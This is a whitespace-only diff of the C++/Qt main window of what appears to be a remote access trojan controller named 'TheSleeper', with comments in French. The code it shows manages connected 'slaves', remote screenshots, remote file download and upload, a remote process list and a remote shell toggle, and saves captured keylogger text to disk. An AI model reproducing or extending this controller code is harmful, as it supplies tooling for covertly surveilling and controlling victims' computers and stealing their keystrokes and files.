@@ -17,7 +17,7 @@ using namespace Network;
 #include "MasterWindow.hpp"
 
 namespace Master
-{ 
+{
     MasterWindow::MasterWindow(QWidget * parent)
     :QMainWindow(parent)
     {
@@ -33,29 +33,29 @@ namespace Master
         connect(actionAboutQt, SIGNAL(triggered()), this, SLOT(aboutQt()));
         connect(actionAboutInnocence, SIGNAL(triggered()), this, SLOT(about()));
         connect(actionEditerClient, SIGNAL(triggered()), &editSlaveDialog, SLOT(show()));
-        
+
         // configuration du screenshot a distance
         screenLabel->setBackgroundRole(QPalette::Base);
         screenLabel->setSizePolicy(QSizePolicy::Ignored, QSizePolicy::Ignored);
         screenLabel->setScaledContents(true);
-        
+
         // construction de l'arbre des fichiers distants
         remoteFilesView->setHeaderHidden(true);
         remoteFilesView->header()->setSectionResizeMode(QHeaderView::Stretch);
         localFilesView->header()->setSectionResizeMode(QHeaderView::Stretch);
-        
+
         // construction de l'arbre des fichiers locaux
 		localFilesModel.setRootPath(localFilesModel.myComputer().toString());
         localFilesView->setModel(&localFilesModel);
         localFilesView->hideColumn(2);
         localFilesView->hideColumn(3);
-        
+
         // configuration du gestionnaire de tache a distance
         processView->setSelectionMode(QAbstractItemView::SingleSelection);
         processView->setModel(&processModel);
-        
+
         connectedSlavesView->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);
-        
+
         // connexions signals / slots pour le panneau de droite
         connect(disconnectButton,     SIGNAL(clicked()), this, SLOT(onDisconnect()));
         connect(listenButton,         SIGNAL(clicked()), this, SLOT(onListen()));
@@ -80,14 +80,14 @@ namespace Master
         connect(remoteFilesView,         SIGNAL(doubleClicked(QModelIndex)), this, SLOT(browseRemoteFiles(QModelIndex)));
         connect(downloadButton,          SIGNAL(clicked()), this, SLOT(startDownload()));
         connect(uploadButton,            SIGNAL(clicked()), this, SLOT(startUpload()));
-        
+
         updateDisconnected();
     }
 
     MasterWindow::~MasterWindow()
     {
         listener->stopListen();
-        
+
         // nettoie tous les objets cores
         for(SlavePtrList::iterator iter = slaves.begin(); iter != slaves.end(); iter++)
         {
@@ -129,18 +129,18 @@ namespace Master
     {
         LOG << "GUI enabled";
         tabWidget->setEnabled(true);
-        
+
         portLabel->setVisible(false);
         portBox->setVisible(false);
         mdpLabel->setVisible(false);
         passEdit->setVisible(false);
         portBox->setEnabled(false);
         passEdit->setEnabled(false);
-        
+
         infoIp->setText(ip);
         infoPort->setText(port);
         connectionStatusLabel->setText(tr(" <font color=\"#19DD2C\">Online </font> "));
-        
+
         disconnectButton->setEnabled(true);
     }
 
@@ -157,7 +157,7 @@ namespace Master
         infoIp->setText(" None ");
         infoPort->setText(" None ");
         connectionStatusLabel->setText(tr(" <font color=\"#FF0000\">Offline </font> "));
-        
+
         if(!slaves.size())
         {
             disconnectButton->setEnabled(false);
@@ -186,7 +186,7 @@ namespace Master
             {
                 // desactivation de l'interface
                 updateDisconnected();
-                
+
                 // on le deconnecte proprement
                 (*currentSlave)->disconnect();
 
@@ -195,7 +195,7 @@ namespace Master
 
                 // on enleve le pointeur de la liste grace a l'iterateur
                 slaves.erase(currentSlave);
-                
+
                 if(slaves.size())
                 {
                     currentSlave = slaves.begin();
@@ -204,13 +204,13 @@ namespace Master
                 {
                     currentSlave = slaves.end();
                 }
-                
+
                 // on met a jour le modele
                 slavesModel.set(slaves);
-                
+
                 // on change de client en cours
                 switchSlave();
-                
+
                 if(currentSlave == slaves.end())
                 {
                     LOG << "No slave left";
@@ -232,9 +232,9 @@ namespace Master
         // un des clients s'est deconnecte, mais on ne sais pas lequel
         // pour le savoir on n'utilise : QObject::sender()
         SlavePtr disconnectedSlave = (SlavePtr) QObject::sender();
-        
+
         LOG << "Slave " + disconnectedSlave->getIp().toStdString() + ":" + disconnectedSlave->getPort().toStdString() + " is connected";
-        
+
 		// on le deconnecte proprement
         disconnectedSlave->disconnect();
 
@@ -243,10 +243,10 @@ namespace Master
         {
             // on enleve le pointeur de la liste grace a l'iterateur
             slaves.erase(iter);
-            
+
             // on met a jour le modele
             slavesModel.set(slaves);
-            
+
 			currentSlave = slaves.begin();
             switchSlave();
         }
@@ -285,17 +285,17 @@ namespace Master
 
             // il faudra mettre a jour l'interface si ce client vient a se deconnecter
             connect(slave, SIGNAL(disconnected()), this, SLOT(onDisconnectedSlave()));
-            
+
             // si l'on active un remote shell, on desactive l'ecoute de nouvelles connexions
             connect(slave, SIGNAL(remoteShellState(bool)), listener, SLOT(setNotListening(bool)));
             connect(slave, SIGNAL(remoteShellState(bool)), this, SLOT(setDisabled(bool)));
-            
+
             // ajout du serveur a la liste des serveurs connectes
             slaves.push_back(slave);
 
             // mise a jour du modele :
             slavesModel.set(slaves);
-                
+
             // si il n'y avait pas de serveur connectes, on fait en sorte que le premier connecté
             // soit celui que l'on veut controler tout de suite
             if(slaves.size() == 1)
@@ -313,7 +313,7 @@ namespace Master
     }
 
     void MasterWindow::onChangeSlave( const QModelIndex & index)
-    {        
+    {
         if(currentIndex == index)
         {
             LOG << "Same slave to control";
@@ -333,7 +333,7 @@ namespace Master
 
     void MasterWindow::switchSlave()
     {
-        LOG << "Switching slave";        
+        LOG << "Switching slave";
         if(currentSlave != slaves.end())
         {
             screenProgressBar->setValue(0);
@@ -360,7 +360,7 @@ namespace Master
 
     void MasterWindow::configureOptions()
     {
-        
+
     }
 
     void MasterWindow::shutdown()
@@ -484,7 +484,7 @@ namespace Master
         screenProgressBar->setValue(0);
         if(currentSlave != slaves.end())
         {
-            (*currentSlave)->updateScreen((int)jpegQualitySpinBox->value(), screenProgressBar);		
+            (*currentSlave)->updateScreen((int)jpegQualitySpinBox->value(), screenProgressBar);
         }
 
 		if(currentSlave != slaves.end())
@@ -524,7 +524,7 @@ namespace Master
         {
             QString fileName = QFileDialog::getSaveFileName(this, tr("Save File"),"C:\\",tr("Text (*.txt)"));
             if(fileName.size())
-            {   
+            {
                 fstream file;
                 file.open(fileName.toStdString().c_str(), std::ios::out | std::ios::app);
                 file.write(keylogEdit->toPlainText().toStdString().c_str(), keylogEdit->toPlainText().toStdString().size());
@@ -561,21 +561,21 @@ namespace Master
                 QMessageBox::information(0, "TheSleeper",tr("Please select a source file instead of source directory"));
                 return;
             }
-            
+
 			if(localFilesView->currentIndex() == QModelIndex ())
             {
                 QMessageBox::information(0, "TheSleeper",tr("Please select a destination folder"));
                 return;
             }
-            
+
             if(!localFilesModel.isDir(localFilesView->currentIndex()))
             {
                 QMessageBox::information(0, "TheSleeper",tr("Please select a destination directory instead of destination file"));
                 return;
             }
-            
+
             QString sourceFilePath = (*currentSlave)->getRemotePath(remoteFilesView->currentIndex());
-            QString destinationFilePath = localFilesModel.filePath(localFilesView->currentIndex()) + "\\" + sourceFileName;    
+            QString destinationFilePath = localFilesModel.filePath(localFilesView->currentIndex()) + "\\" + sourceFileName;
             (*currentSlave)->startDownload(sourceFilePath, destinationFilePath, transferProgressBar);
         }
     }
@@ -589,18 +589,18 @@ namespace Master
                 QMessageBox::information(0, "TheSleeper",tr("Please select the file to upload"));
                 return;
             }
-            
+
             QString destinationFileName = (*currentSlave)->getRemoteFileTree().data(remoteFilesView->currentIndex()).toString();
             if(destinationFileName[destinationFileName.size()-1] != '\\')
             {
                 QMessageBox::information(0, "TheSleeper",tr("Please select a destination directory"));
                 return;
             }
-            
+
             QString sourceFilePath = localFilesModel.filePath(localFilesView->currentIndex());
             QString destinationFilePath = (*currentSlave)->getRemotePath(remoteFilesView->currentIndex()) + localFilesModel.fileName(localFilesView->currentIndex());;
             (*currentSlave)->startUpload(sourceFilePath, destinationFilePath, transferProgressBar);
         }
     }
-    
+
 } // Master
